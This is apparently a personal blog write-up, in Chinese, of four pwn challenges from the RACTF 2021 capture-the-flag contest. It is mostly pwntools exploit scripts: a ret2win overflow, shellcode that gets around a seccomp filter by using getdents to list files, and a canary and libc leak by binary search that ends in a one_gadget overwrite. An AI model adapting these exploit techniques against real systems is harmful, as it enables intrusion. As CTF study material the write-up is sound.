
---
title: ractf2021-pwn-ctf
categories: [CTF]
tags: [wp,pwn]

---
周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。<!--more-->

## archer

简单的变量覆盖...

```python
from pwn import *
import libcfind

elf='archer'
e=ELF(elf)
p=remote('193.57.159.27',49723)
#p=process(elf)
p.sendline('yes1')
#gdb.attach(p)
p.sendline('-fbf98')
p.interactive()
```

## ret2winrars

签到，elf内自带后门。

```python
from pwn import *
import libcfind

elf='./ret2winrars'
e=ELF(elf)
p=remote('193.57.159.27',30527)
#process(elf)
#gdb.attach(p)
p.sendline(0x20*'1'+'2'*8+p64(0x000000000401166))

p.interactive()
```

## notsimple

很有意思的一道题,flag是文件名，同时seccomp 禁用execve所以无法使用命令执行。

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x09 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013
 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013
 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013
 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

但是经过查阅资料后发现，`ls`的底层是依赖系统调用`getdents`.

所以我们可以`getdents`系统来读取文件目录.

```python
from pwn import *
context(os='linux', arch='amd64')
e=ELF('./notsimple')
#p=process('./notsimple')
p=remote('193.57.159.27',46343)
p.recvuntil("Oops, I'm leaking!")
addr=int(p.recvline(),16)
log.info(hex(addr))

addr2=addr+0x400
shell=asm("""
mov rsi,  %s;
 mov rdx, 0x800;
 mov rdi, 0x0;
 mov r10, 0x0;
 mov rax, 0x0;
 syscall;
 mov rax,%s;
 jmp rax;
"""%(hex(addr2),hex(addr2)))
print(len(shell))

p.sendline(shell+(0x50-len(shell))*'1'+p64(0)+p64(addr))

sleep(3)
addr3=addr+0x1000
shell2=asm("""
mov rsi,  %s;
 mov rdx, 0x80;
 mov rdi, 0x0;
 mov r10, 0x0;
 mov rax, 0x0;
 syscall;
 mov rsi, %s;
 mov rdx, 0x8;
 mov rdi, 0x1;
 mov r10, 0x0;
 mov rax, 0x1;
 syscall;
  mov rdi, %s;
 mov rdx, 0x0;
 mov rsi, 0x10000;
 mov r10, 0x0;
 mov rax, 0x2;
 syscall;
mov rdi, rax ;// fd
mov rsi, %s ;// buf
mov edx, 1024 ;// count
mov rax, 78 ;// SYS_getdents
 syscall

 mov rsi, %s;
 mov rdx, 0x680;
 mov rdi, 0x1;
 mov r10, 0x0;
 mov rax, 0x1;
 syscall;
 mov rdi, 0 ;// exit
mov rax, 60;
syscall
"""%(hex(addr3),hex(addr3),hex(addr3),hex(addr3),hex(addr3)))

p.sendline(shell2)
sleep(3)
p.sendline('/pwn\x00')
p.interactive()


```

## guessing

有意思的一道题,在我们只有8次猜中数字的机会但是我们要猜出canary和libc基地址，一共16个数字。

我们可以通过`256== 2**8`的特性在7次猜测下大概在通过大小推理出任意一个数。

```python
def guss(nums):
    i=0
    depth = 0
    addition = 0
    count=0
    canary2=0
    while True:
        my_guess = 0x100 // 2 + addition
        #print('my_guess: '+str(my_guess))
        depth += 1
        if my_guess<nums[i]:
            if depth == 7:
                my_guess += 1
                canary2 += (0x10 ** (2 * i)) * my_guess
                print('low get!'+str(my_guess))
                #print(hex(canary))
                i += 1
                depth = 0
                addition = 0
            else:
                addition += 0x100 // (2 ** (depth + 1))
        elif my_guess>nums[i]:
            if depth == 7:
                my_guess -= 1
                canary2 += (0x10 ** (2 * i)) * my_guess
            # print(hex(canary))
                print('high get!'+str(my_guess))
                i += 1
                depth = 0
                addition = 0
            else:
                addition += -1 * (0x100 // (2 ** (depth + 1)))
        else:
            canary2 += (0x10 ** ( 2 * i)) * my_guess
            #print(hex(canary))
            i += 1
            depth = 0
            addition = 0
            count += 1
            print('samlle get!'+str(my_guess))
            #print('one true')
        if i == 8:
            break

n=[111,34,155,33,23,55,32,90]

guss(n)
```

从而在8次内尽可能得到16位数字。

```python
from pwn import *
from ctypes import *
from libcfind import *
#target = process('./guess')


target=process('./guess')#remote('193.57.159.27', 55206)
elf = ELF('./guess')
count = 0
c = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
c.srand((c.time(0)))
x=[]

for i in range(8):
    k=c.rand()
    k=k%255
    x.append(k)
    print(hex(k))
print(x)
i = 1
depth = 0
addition = 0
canary = 0
while True:
    print(target.recvuntil(b'(0-7)?'))
    target.sendline(str(0x20 + i).encode('ascii'))
    print(target.recvuntil(b'guess:'))
    my_guess = 0x100 // 2 + addition
    #print(hex(my_guess))
    target.sendline(str(my_guess).encode('ascii'))
    result = target.recvuntil(b'Which')
    depth += 1
    if b'low' in result:
        if depth == 7:
            my_guess += 1
            canary += (0x10 ** (2 * i)) * my_guess
            #print(hex(canary))
            i += 1
            depth = 0
            addition = 0
        else:
            addition += 0x100 // (2 ** (depth + 1))
    elif b'high' in result:
        if depth == 7:
            my_guess -= 1
            canary += (0x10 ** (2 * i)) * my_guess
           # print(hex(canary))
            i += 1
            depth = 0
            addition = 0
        else:
            addition += -1 * (0x100 // (2 ** (depth + 1)))
    else:
        canary += (0x10 ** ( 2 * i)) * my_guess
        #print(hex(canary))
        i += 1
        depth = 0
        addition = 0
        count += 1
        print('one true')
    if i == 8:
        break
print(canary)
#target.interactive()

i=0
depth = 0
addition = 0
libc_start = 0
while True:
    print(target.recvuntil(b'(0-7)?'))
    target.sendline(str(0x30 + i).encode('ascii'))
    print(target.recvuntil(b'guess:'))
    my_guess = 0x100 // 2 + addition
    #print(hex(my_guess))
    target.sendline(str(my_guess).encode('ascii'))
    result = target.recvuntil(b'Which')
    depth += 1
    if b'low' in result:
        if depth == 7:
            my_guess += 1
            libc_start += (0x10 ** (2 * i)) * my_guess
            #print(hex(canary))
            i += 1
            depth = 0
            addition = 0
        else:
            addition += 0x100 // (2 ** (depth + 1))
    elif b'high' in result:
        if depth == 7:
            my_guess -= 1
            libc_start += (0x10 ** (2 * i)) * my_guess
           # print(hex(canary))
            i += 1
            depth = 0
            addition = 0
        else:
            addition += -1 * (0x100 // (2 ** (depth + 1)))
    else:
        libc_start += (0x10 ** ( 2 * i)) * my_guess
        #print(hex(canary))
        i += 1
        depth = 0
        addition = 0
        count += 1
        print('one true')
    if i == 6:
        break

print(hex(libc_start))
libc_start_main=libc_start-234
log.info('libc_start_main:'+str(libc_start_main))
print(count)

for i in range(8-count):
    target.sendline(str(i))
    target.recvuntil('Enter your guess:')
    target.sendline(str(x[i]))
#gdb.attach(target)

x=finder('__libc_start_main',libc_start_main)

target.sendline('x'*0x18+p64(canary)+p64(0)+p64(x.ogg(1)))
target.interactive()
```

